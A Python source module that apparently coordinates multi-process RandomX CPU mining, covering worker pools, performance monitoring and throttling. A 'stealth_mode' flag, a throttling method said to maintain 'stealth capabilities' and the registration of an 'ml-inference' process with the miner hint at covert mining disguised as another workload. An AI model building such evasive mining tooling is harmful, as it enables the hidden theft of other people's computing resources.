"""
mining_integration_adapter.py

Integration Adapter for OptimizedCalculationChain với existing mining infrastructure.
Provides seamless integration between new multi-process architecture và current system.

Author: Claude AI Optimization Framework
Purpose: Bridge between optimized components và legacy mining system
"""

import os
import time
import threading
import logging
import subprocess
from typing import Dict, Any, Optional, List, Callable
from concurrent.futures import ThreadPoolExecutor, Future
from dataclasses import dataclass

# Import optimized components
try:
    from .optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
    from .workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
    from .low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
    from .randomx_optimizer import XeonE5OptimizedConfig
except ImportError:
    # Fallback for standalone testing
    from optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
    from workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
    from low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
    from randomx_optimizer import XeonE5OptimizedConfig


@dataclass
class MiningSessionConfig:
    """Configuration cho một mining session - Enhanced for CPU utilization"""
    profile: str = "optimized"
    total_iterations: int = 50000000  # 50M iterations per batch (5x increase)
    batch_size: int = 5000000  # 5M iterations per batch (5x increase)
    monitoring_interval: float = 2.0  # Monitor every 2 seconds (faster monitoring)
    auto_restart: bool = True
    throttling_enabled: bool = True
    stealth_mode: bool = False


@dataclass
class PerformanceMetrics:
    """Real-time performance metrics"""
    timestamp: float
    total_cpu_utilization: float
    per_core_utilization: List[float]
    hashrate: float
    tasks_completed: int
    active_workers: int
    thermal_status: str = "normal"
    efficiency_score: float = 0.0


class MiningIntegrationAdapter:
    """
    Adapter để tích hợp OptimizedCalculationChain với existing mining infrastructure.
    Replaces subprocess-based mining với multi-process optimized approach.
    """
    
    def __init__(self, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger(__name__)
        
        # Core components
        self.calculation_chain: Optional[OptimizedCalculationChain] = None
        self.workload_distributor: Optional[WorkloadDistributor] = None
        self.synchronization: Optional[LowOverheadSynchronization] = None
        self.config_generator = XeonE5OptimizedConfig(logger=self.logger)
        
        # Session management
        self.current_session: Optional[MiningSessionConfig] = None
        self.is_running = False
        self.is_initialized = False
        
        # Performance tracking
        self.performance_history: List[PerformanceMetrics] = []
        self.max_history_size = 1000
        
        # Threading
        self.monitoring_thread: Optional[threading.Thread] = None
        self.workload_thread: Optional[threading.Thread] = None
        self.shutdown_event = threading.Event()
        
        # Integration state
        self.legacy_process_replacement = False
        self.throttling_manager: Optional[Callable] = None
        
        self.logger.info("MiningIntegrationAdapter initialized")
    
    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None, auto_start: bool = True) -> bool:
        """
        Initialize optimized mining components.
        Replaces traditional subprocess.Popen approach.
        """
        try:
            # 🔧 Process-level initialization logging
            self.logger.info(f"[INIT-LOG] Initializing optimized mining - Process PID: {os.getpid()}")
            
            if self.is_initialized:
                self.logger.warning(f"[INIT-LOG] Optimized mining already initialized - Process PID: {os.getpid()}")
                return True
            
            self.logger.info(f"[INIT-LOG] Initializing optimized mining system for {cores} cores - Process PID: {os.getpid()}")
            
            # Generate optimized configuration
            if not config:
                self.logger.info(f"[INIT-LOG] Generating optimized configuration...")
                config = self.config_generator.generate_mining_config(
                    performance_profile='optimized', 
                    use_optimized_chain=True
                )
                self.logger.info(f"[INIT-LOG] Configuration generated: {config}")
            
            # 🔧 Initialize core components với process logging
            self.logger.info(f"[INIT-LOG] Creating calculation chain for {cores} cores...")
            self.calculation_chain = create_optimized_mining_chain(cores=cores, logger=self.logger)
            if not self.calculation_chain:
                raise RuntimeError("Failed to create calculation chain")
            self.logger.info(f"[INIT-LOG] ✅ Calculation chain created")
            
            self.logger.info(f"[INIT-LOG] Creating workload distributor...")
            self.workload_distributor = create_balanced_distributor(cores=cores, logger=self.logger)
            if not self.workload_distributor:
                raise RuntimeError("Failed to create workload distributor")
            self.logger.info(f"[INIT-LOG] ✅ Workload distributor created")
            
            self.logger.info(f"[INIT-LOG] Creating synchronization component...")
            self.synchronization = create_high_performance_sync(cores=cores, logger=self.logger)
            if not self.synchronization:
                raise RuntimeError("Failed to create synchronization component")
            self.logger.info(f"[INIT-LOG] ✅ Synchronization component created")
            
            # Register RandomX task profile
            self.logger.info(f"[INIT-LOG] Registering RandomX task profile...")
            randomx_profile = TaskProfile(
                task_type="randomx_mining",
                estimated_complexity=1.2,
                cache_sensitivity=1.8,  # RandomX is cache-sensitive
                parallel_efficiency=0.98  # Excellent parallel efficiency
            )
            self.workload_distributor.register_task_profile("randomx_mining", randomx_profile)
            self.logger.info(f"[INIT-LOG] ✅ RandomX task profile registered")
            
            # Initialize calculation chain worker pool
            self.logger.info(f"[INIT-LOG] Initializing worker pool...")
            if not self.calculation_chain.initialize_worker_pool():
                raise RuntimeError("Failed to initialize worker pool")
            self.logger.info(f"[INIT-LOG] ✅ Worker pool initialized")
            
            # Start workload distributor
            self.logger.info(f"[INIT-LOG] Starting workload distributor...")
            self.workload_distributor.start()
            self.logger.info(f"[INIT-LOG] ✅ Workload distributor started")
            
            # 🔧 Verify component initialization
            if hasattr(self.calculation_chain, 'get_performance_stats'):
                try:
                    init_stats = self.calculation_chain.get_performance_stats()
                    self.logger.info(f"[INIT-LOG] Initial performance stats: {init_stats}")
                except Exception as stats_error:
                    self.logger.warning(f"[INIT-LOG] Could not get initial stats: {stats_error}")
            
            self.is_initialized = True
            self.legacy_process_replacement = True

            # 🚀 Auto-start mining session nếu auto_start=True
            if auto_start and not self.is_running:
                self.logger.info("[INIT-LOG] Auto-starting mining session (auto_start=True)")
                self.start_mining_session()

            self.logger.info(f"[INIT-LOG] ✅ Optimized mining system initialized successfully - Process PID: {os.getpid()}")
            return True
            
        except Exception as e:
            self.logger.error(f"[INIT-LOG] ❌ Failed to initialize optimized mining: {e}")
            self.cleanup()
            return False
    
    def start_mining_session(self, session_config: Optional[MiningSessionConfig] = None) -> bool:
        """
        Start mining session với optimized calculation chain.
        Returns True if started successfully.
        """
        try:
            # 🔧 Process-level session startup logging
            self.logger.info(f"[SESSION-LOG] Starting mining session - Process PID: {os.getpid()}")
            
            if not self.is_initialized:
                self.logger.info(f"[SESSION-LOG] System not initialized, initializing...")
                if not self.initialize_optimized_mining():
                    self.logger.error(f"[SESSION-LOG] Failed to initialize optimized mining")
                    return False
            
            if self.is_running:
                self.logger.warning(f"[SESSION-LOG] Mining session already running - Process PID: {os.getpid()}")
                return True
            
            # Use default config if none provided
            self.current_session = session_config or MiningSessionConfig()
            
            self.logger.info(f"[SESSION-LOG] Session config: profile={self.current_session.profile}, "
                           f"batch_size={self.current_session.batch_size}, "
                           f"total_iterations={self.current_session.total_iterations}")
            
            # 🔧 Process-level thread startup logging
            self.logger.info(f"[SESSION-LOG] Starting monitoring and workload threads...")
            
            # Start monitoring
            self.shutdown_event.clear()
            self.monitoring_thread = threading.Thread(
                target=self._monitoring_loop,
                daemon=True,
                name=f"MiningMonitor-{os.getpid()}"
            )
            self.monitoring_thread.start()
            self.logger.info(f"[SESSION-LOG] Monitoring thread started: {self.monitoring_thread.name}")
            
            # Start workload management
            self.workload_thread = threading.Thread(
                target=self._workload_management_loop,
                daemon=True,
                name=f"WorkloadManager-{os.getpid()}"
            )
            self.workload_thread.start()
            self.logger.info(f"[SESSION-LOG] Workload thread started: {self.workload_thread.name}")
            
            # 🔧 Verify thread startup
            time.sleep(0.5)  # Short wait for threads to initialize
            
            monitor_alive = self.monitoring_thread.is_alive()
            workload_alive = self.workload_thread.is_alive()
            
            self.logger.info(f"[SESSION-LOG] Thread status: Monitor={monitor_alive}, Workload={workload_alive}")
            
            if not monitor_alive or not workload_alive:
                self.logger.error(f"[SESSION-LOG] Thread startup failed - Monitor: {monitor_alive}, Workload: {workload_alive}")
                return False
            
            self.is_running = True
            self.logger.info(f"[SESSION-LOG] ✅ Mining session started successfully - Process PID: {os.getpid()}")
            
            # 🔧 Initial worker status check
            if hasattr(self.calculation_chain, 'get_performance_stats'):
                try:
                    initial_stats = self.calculation_chain.get_performance_stats()
                    self.logger.info(f"[SESSION-LOG] Initial worker stats: {initial_stats}")
                except Exception as stats_error:
                    self.logger.warning(f"[SESSION-LOG] Could not get initial worker stats: {stats_error}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"[SESSION-LOG] Failed to start mining session: {e}")
            return False
    
    def stop_mining_session(self) -> bool:
        """
        Stop current mining session gracefully.
        """
        try:
            if not self.is_running:
                self.logger.info("No active mining session to stop")
                return True
            
            self.logger.info("Stopping mining session...")
            
            # Signal shutdown
            self.shutdown_event.set()
            
            # Wait for threads to finish
            if self.monitoring_thread and self.monitoring_thread.is_alive():
                self.monitoring_thread.join(timeout=10.0)
            
            if self.workload_thread and self.workload_thread.is_alive():
                self.workload_thread.join(timeout=10.0)
            
            self.is_running = False
            self.current_session = None
            
            self.logger.info("✅ Mining session stopped successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping mining session: {e}")
            return False
    
    def apply_throttling(self, throttle_percentage: float) -> bool:
        """
        Apply CPU throttling compatible với existing throttling system.
        Maintains stealth capabilities.
        """
        if not self.is_initialized or not self.calculation_chain:
            self.logger.warning("Cannot apply throttling: system not initialized")
            return False
        
        try:
            success = self.calculation_chain.apply_throttling(throttle_percentage)
            if success:
                # Gọi callback để chuỗi tính toán tự điều chỉnh nhịp nghỉ/luồng
                if hasattr(self.calculation_chain, "on_throttle_change"):
                    try:
                        self.calculation_chain.on_throttle_change(throttle_percentage)
                    except Exception as cb_err:
                        self.logger.warning(f"on_throttle_change callback error: {cb_err}")
                self.logger.info(f"Applied {throttle_percentage}% throttling to optimized mining")
            return success
            
        except Exception as e:
            self.logger.error(f"Failed to apply throttling: {e}")
            return False
    
    def register_external_process(self, pid: int) -> bool:
        """
        Register external ml-inference process with mining adapter.
        
        Args:
            pid: Process ID of external process
            
        Returns:
            bool: True if successfully registered, False otherwise
        """
        try:
            self.logger.info(f"📝 Registering external process PID={pid} with mining adapter")
            
            # Store external process PID for monitoring
            if not hasattr(self, 'external_processes'):
                self.external_processes = []
            
            self.external_processes.append(pid)
            
            # Enable monitoring for external process
            if self.workload_distributor:
                try:
                    self.workload_distributor.register_external_process(pid)
                    self.logger.info(f"✅ Registered PID={pid} with workload distributor")
                except Exception as e:
                    self.logger.warning(f"Failed to register PID with workload distributor: {e}")
            
            self.logger.info(f"🎯 Successfully registered external process PID={pid}")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to register external process PID={pid}: {e}")
            return False

    def get_performance_metrics(self) -> Optional[PerformanceMetrics]:
        """Get current performance metrics"""
        if not self.is_initialized:
            return None
        
        try:
            # Get stats from calculation chain
            chain_stats = self.calculation_chain.get_performance_stats()
            
            # Get stats from workload distributor  
            distributor_stats = self.workload_distributor.get_performance_summary()
            
            # Calculate total CPU utilization
            total_cpu = sum(chain_stats['core_utilizations'])
            per_core_cpu = chain_stats['core_utilizations']
            
            # Create metrics object
            metrics = PerformanceMetrics(
                timestamp=time.time(),
                total_cpu_utilization=total_cpu,
                per_core_utilization=per_core_cpu,
                hashrate=chain_stats['average_hashrate'],
                tasks_completed=chain_stats['total_tasks_completed'],
                active_workers=chain_stats['active_workers'],
                efficiency_score=distributor_stats['load_balance_score']
            )
            
            # Add to history
            self.performance_history.append(metrics)
            if len(self.performance_history) > self.max_history_size:
                self.performance_history = self.performance_history[-self.max_history_size//2:]
            
            return metrics
            
        except Exception as e:
            self.logger.error(f"Error getting performance metrics: {e}")
            return None
    
    def _monitoring_loop(self):
        """Background monitoring của mining performance với process-level logging"""
        monitor_count = 0
        
        # 🔧 Process-level monitoring initialization
        self.logger.info(f"[MONITOR-LOG] Starting monitoring loop - PID: {os.getpid()}")
        
        while not self.shutdown_event.is_set():
            try:
                monitor_count += 1
                
                # 🔧 Process-level monitoring logging
                self.logger.debug(f"[MONITOR-LOG] Monitor cycle {monitor_count} - PID: {os.getpid()}")
                
                # Get current metrics
                metrics = self.get_performance_metrics()
                if metrics:
                    # 🔧 Enhanced performance logging với process context
                    self.logger.info(f"[MONITOR-LOG] 📊 Performance: {metrics.total_cpu_utilization:.1f}% CPU, "
                                    f"{metrics.hashrate:.2f} H/s, {metrics.active_workers} workers, "
                                    f"efficiency: {metrics.efficiency_score:.3f}")
                    
                    # 🔧 Process-level performance issue detection
                    if metrics.total_cpu_utilization < 600:  # Below 75% of 800% target
                        self.logger.warning(f"[MONITOR-LOG] ⚠️ Low CPU utilization: {metrics.total_cpu_utilization:.1f}% - Process PID: {os.getpid()}")
                        
                        # Additional diagnostic logging
                        if hasattr(self.calculation_chain, 'get_worker_status'):
                            worker_status = self.calculation_chain.get_worker_status()
                            self.logger.warning(f"[MONITOR-LOG] Worker status: {worker_status}")
                    
                    if metrics.active_workers < self.calculation_chain.cores:
                        self.logger.warning(f"[MONITOR-LOG] ⚠️ Some workers inactive: {metrics.active_workers}/{self.calculation_chain.cores} - Process PID: {os.getpid()}")
                        
                        # Try to diagnose worker communication issues
                        try:
                            stats = self.calculation_chain.get_performance_stats()
                            self.logger.warning(f"[MONITOR-LOG] Worker details: {stats}")
                        except Exception as stats_error:
                            self.logger.error(f"[MONITOR-LOG] Error getting worker stats: {stats_error}")
                    
                    # 🔧 Hash rate zero detection
                    if metrics.hashrate == 0.0:
                        self.logger.error(f"[MONITOR-LOG] 🔴 HASH RATE ZERO DETECTED - Process PID: {os.getpid()}")
                        self.logger.error(f"[MONITOR-LOG] Tasks completed: {metrics.tasks_completed}, Active workers: {metrics.active_workers}")
                        
                        # Enhanced diagnostic information
                        if hasattr(self.calculation_chain, 'diagnose_workers'):
                            diagnosis = self.calculation_chain.diagnose_workers()
                            self.logger.error(f"[MONITOR-LOG] Worker diagnosis: {diagnosis}")
                    
                    # 🔧 Worker communication health check
                    if metrics.active_workers > 0 and metrics.hashrate > 0:
                        self.logger.debug(f"[MONITOR-LOG] ✅ Worker communication healthy - {metrics.active_workers} workers producing {metrics.hashrate:.2f} H/s")
                else:
                    # 🔧 No metrics available logging
                    self.logger.warning(f"[MONITOR-LOG] ❌ No performance metrics available - Process PID: {os.getpid()}")
                    
                    # Try to diagnose why metrics are unavailable
                    if not self.calculation_chain:
                        self.logger.error(f"[MONITOR-LOG] Calculation chain not initialized")
                    elif not self.workload_distributor:
                        self.logger.error(f"[MONITOR-LOG] Workload distributor not initialized")
                    else:
                        self.logger.error(f"[MONITOR-LOG] Components initialized but metrics unavailable")
                
                # Wait for next monitoring interval
                interval = self.current_session.monitoring_interval if self.current_session else 5.0
                self.logger.debug(f"[MONITOR-LOG] Waiting {interval}s for next monitoring cycle")
                self.shutdown_event.wait(interval)
                
            except Exception as e:
                self.logger.error(f"[MONITOR-LOG] Monitoring loop error in cycle {monitor_count}: {e}")
                self.shutdown_event.wait(5.0)
        
        self.logger.info(f"[MONITOR-LOG] Monitoring loop terminated - Total cycles: {monitor_count}")
    
    def _workload_management_loop(self):
        """
        Enhanced workload management loop để ensure continuous CPU utilization.
        Fixes the issue where workers become idle.
        """
        batch_counter = 0
        consecutive_empty_results = 0
        last_hash_rate_report = time.time()
        
        # 🔧 Detailed process logging để track subprocess execution
        self.logger.info(f"[PROCESS-LOG] Starting workload management loop - PID: {os.getpid()}")
        self.logger.info(f"[PROCESS-LOG] Worker pool cores: {self.calculation_chain.cores if self.calculation_chain else 'N/A'}")
        
        while not self.shutdown_event.is_set():
            try:
                if not self.current_session:
                    self.logger.warning(f"[PROCESS-LOG] No current session - breaking loop")
                    break
                
                batch_counter += 1
                batch_start_time = time.time()
                
                # 🔧 Process-level logging cho batch submission
                self.logger.info(f"[PROCESS-LOG] Batch {batch_counter} starting - Process PID: {os.getpid()}")
                
                # Submit multiple overlapping workloads để maintain CPU saturation
                submitted_tasks = []
                for i in range(5):  # Tăng từ 3 lên 5 batches để ensure worker saturation
                    try:
                        # Larger workloads với staggered submission
                        workload_size = self.current_session.batch_size * 2  # Double the workload size
                        task_id = self.calculation_chain.submit_workload(
                            total_iterations=workload_size
                        )
                        submitted_tasks.append(task_id)
                        self.logger.info(f"[PROCESS-LOG] Submitted enhanced workload {task_id}: {workload_size} iterations to {self.calculation_chain.cores} cores")
                        
                        # Brief delay between submissions để prevent queue overflow
                        time.sleep(0.1)
                        
                    except Exception as submit_error:
                        self.logger.error(f"[PROCESS-LOG] Failed to submit workload {i}: {submit_error}")
                
                if not submitted_tasks:
                    self.logger.error(f"[PROCESS-LOG] No workloads submitted in batch {batch_counter}")
                    consecutive_empty_results += 1
                    self.shutdown_event.wait(1.0)
                    continue
                
                # Collect results with shorter timeout để maintain responsiveness
                all_results = []
                result_collection_start = time.time()
                results_received = 0
                
                while time.time() - result_collection_start < 20.0:  # Tăng timeout từ 15s lên 20s
                    try:
                        results = self.calculation_chain.get_results(timeout=3.0)  # Tăng từ 2s lên 3s
                        if results:
                            all_results.extend(results)
                            results_received += len(results)
                            consecutive_empty_results = 0
                            
                            # 🔧 Process-level result logging
                            for result in results:
                                self.logger.debug(f"[PROCESS-LOG] Core {result.core_id}: {result.iterations_completed} iterations in {result.computation_time:.3f}s, CPU: {result.cpu_utilization:.1f}%")
                                
                                # Update distributor với task completion times
                                if self.workload_distributor:
                                    self.workload_distributor.update_task_completion(
                                        result.core_id, 
                                        result.computation_time, 
                                        True
                                    )
                        else:
                            consecutive_empty_results += 1
                            # 🔧 Log empty result cycles với process context
                            if consecutive_empty_results <= 3:
                                self.logger.debug(f"[PROCESS-LOG] Empty result cycle {consecutive_empty_results} - waiting for workers")
                            elif consecutive_empty_results == 8:
                                self.logger.warning(f"[PROCESS-LOG] Multiple empty result cycles ({consecutive_empty_results}) - checking worker health")
                            
                            if consecutive_empty_results > 10:
                                self.logger.error(f"[PROCESS-LOG] Too many empty result cycles ({consecutive_empty_results}) - worker communication failure")
                                break
                    except Exception as result_error:
                        self.logger.error(f"[PROCESS-LOG] Error getting results: {result_error}")
                        consecutive_empty_results += 1
                
                # 🔧 Detailed batch completion logging
                if all_results:
                    batch_duration = time.time() - batch_start_time
                    total_iterations = sum(r.iterations_completed for r in all_results)
                    avg_cpu = sum(r.cpu_utilization for r in all_results) / len(all_results)
                    hash_rate = total_iterations / batch_duration if batch_duration > 0 else 0.0
                    
                    self.logger.info(f"[PROCESS-LOG] ✅ Batch {batch_counter} SUCCESS: {len(all_results)} results, "
                                   f"{total_iterations} iterations, {avg_cpu:.1f}% avg CPU, "
                                   f"{hash_rate:.2f} H/s, {batch_duration:.2f}s duration")
                    
                    # Hash rate reporting mỗi 30 giây
                    if time.time() - last_hash_rate_report >= 30:
                        self.logger.info(f"[HASH-RATE] Current: {hash_rate:.2f} H/s, Active workers: {len(all_results)}, Batch: {batch_counter}")
                        last_hash_rate_report = time.time()
                        
                else:
                    self.logger.warning(f"[PROCESS-LOG] ❌ Batch {batch_counter} FAILED: No results received")
                    
                    # 🔧 Enhanced worker health check với process logging
                    try:
                        stats = self.calculation_chain.get_performance_stats()
                        active_workers = stats.get('active_workers', 0)
                        total_workers = self.calculation_chain.cores
                        
                        self.logger.error(f"[PROCESS-LOG] Worker status: {active_workers}/{total_workers} active")
                        
                        if active_workers < total_workers:
                            self.logger.error(f"[PROCESS-LOG] CRITICAL: Only {active_workers}/{total_workers} workers active - potential communication failure")
                            
                            # Force worker restart attempt
                            if hasattr(self.calculation_chain, 'restart_workers'):
                                self.logger.info(f"[PROCESS-LOG] Attempting worker restart...")
                                self.calculation_chain.restart_workers()
                                
                    except Exception as health_error:
                        self.logger.error(f"[PROCESS-LOG] Error checking worker health: {health_error}")
                
                # Adaptive pause dựa trên performance
                if all_results:
                    pause_time = 0.1  # Short pause when successful
                else:
                    pause_time = min(2.0, 0.5 + (consecutive_empty_results * 0.2))  # Increasing pause for failures
                    
                self.logger.debug(f"[PROCESS-LOG] Waiting {pause_time:.1f}s before next batch")
                self.shutdown_event.wait(pause_time)
                
            except Exception as e:
                self.logger.error(f"[PROCESS-LOG] Workload management error in batch {batch_counter}: {e}")
                self.shutdown_event.wait(2.0)
        
        self.logger.info(f"[PROCESS-LOG] Workload management loop terminated - Total batches: {batch_counter}")
    
    def cleanup(self):
        """Clean up all resources"""
        try:
            self.logger.info("Cleaning up MiningIntegrationAdapter...")
            
            # Stop session if running
            if self.is_running:
                self.stop_mining_session()
            
            # Shutdown components
            if self.calculation_chain:
                self.calculation_chain.shutdown()
                self.calculation_chain = None
            
            if self.workload_distributor:
                self.workload_distributor.stop()
                self.workload_distributor = None
            
            if self.synchronization:
                self.synchronization.cleanup()
                self.synchronization = None
            
            self.is_initialized = False
            self.legacy_process_replacement = False
            
            self.logger.info("✅ MiningIntegrationAdapter cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")
    
    def get_integration_status(self) -> Dict[str, Any]:
        """Get current integration status"""
        return {
            'initialized': self.is_initialized,
            'running': self.is_running,
            'legacy_replacement': self.legacy_process_replacement,
            'components': {
                'calculation_chain': self.calculation_chain is not None,
                'workload_distributor': self.workload_distributor is not None,
                'synchronization': self.synchronization is not None
            },
            'session_config': self.current_session.__dict__ if self.current_session else None,
            'performance_history_size': len(self.performance_history)
        }
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()


# Factory functions for easy integration
def create_mining_adapter(logger: Optional[logging.Logger] = None) -> MiningIntegrationAdapter:
    """Create mining integration adapter"""
    return MiningIntegrationAdapter(logger=logger)


def replace_subprocess_mining(mining_command: List[str], 
                            logger: Optional[logging.Logger] = None) -> MiningIntegrationAdapter:
    """
    Replace subprocess-based mining với optimized calculation chain.
    Used to replace subprocess.Popen calls in start_mining.py
    """
    adapter = create_mining_adapter(logger=logger)
    
    # Extract cores from system or use default
    cores = os.cpu_count() or 8
    
    # Initialize với optimized settings
    if adapter.initialize_optimized_mining(cores=cores):
        # Start mining session
        session_config = MiningSessionConfig(
            profile="optimized",
            total_iterations=50000000,  # 50M iterations
            batch_size=5000000,         # 5M per batch
            auto_restart=True,
            throttling_enabled=True
        )
        
        if adapter.start_mining_session(session_config):
            logger.info("✅ Successfully replaced subprocess mining với optimized chain")
            return adapter
    
    logger.error("❌ Failed to replace subprocess mining")
    adapter.cleanup()
    return None


if __name__ == "__main__":
    # Test integration adapter
    import sys
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    try:
        with create_mining_adapter(logger=logger) as adapter:
            logger.info("🚀 Testing MiningIntegrationAdapter...")
            
            # Test initialization
            success = adapter.initialize_optimized_mining(cores=8)
            logger.info(f"Initialization: {'✅ SUCCESS' if success else '❌ FAILED'}")
            
            if success:
                # Test mining session
                session_success = adapter.start_mining_session()
                logger.info(f"Mining session: {'✅ SUCCESS' if session_success else '❌ FAILED'}")
                
                if session_success:
                    # Run for a short test period
                    time.sleep(10.0)
                    
                    # Get performance metrics
                    metrics = adapter.get_performance_metrics()
                    if metrics:
                        logger.info(f"📊 Performance Test Results:")
                        logger.info(f"   Total CPU: {metrics.total_cpu_utilization:.1f}%")
                        logger.info(f"   Hashrate: {metrics.hashrate:.2f} H/s")
                        logger.info(f"   Tasks: {metrics.tasks_completed}")
                        logger.info(f"   Workers: {metrics.active_workers}")
                        logger.info(f"   Efficiency: {metrics.efficiency_score:.3f}")
                    
                    # Test throttling
                    throttle_success = adapter.apply_throttling(30.0)
                    logger.info(f"Throttling test: {'✅ SUCCESS' if throttle_success else '❌ FAILED'}")
                    
                    # Stop session
                    stop_success = adapter.stop_mining_session()
                    logger.info(f"Session stop: {'✅ SUCCESS' if stop_success else '❌ FAILED'}")
            
            # Get integration status
            status = adapter.get_integration_status()
            logger.info(f"Integration status: {status}")
            
            logger.info("✅ MiningIntegrationAdapter test completed successfully")
            
    except Exception as e:
        logger.error(f"❌ Test failed: {e}")
        sys.exit(1)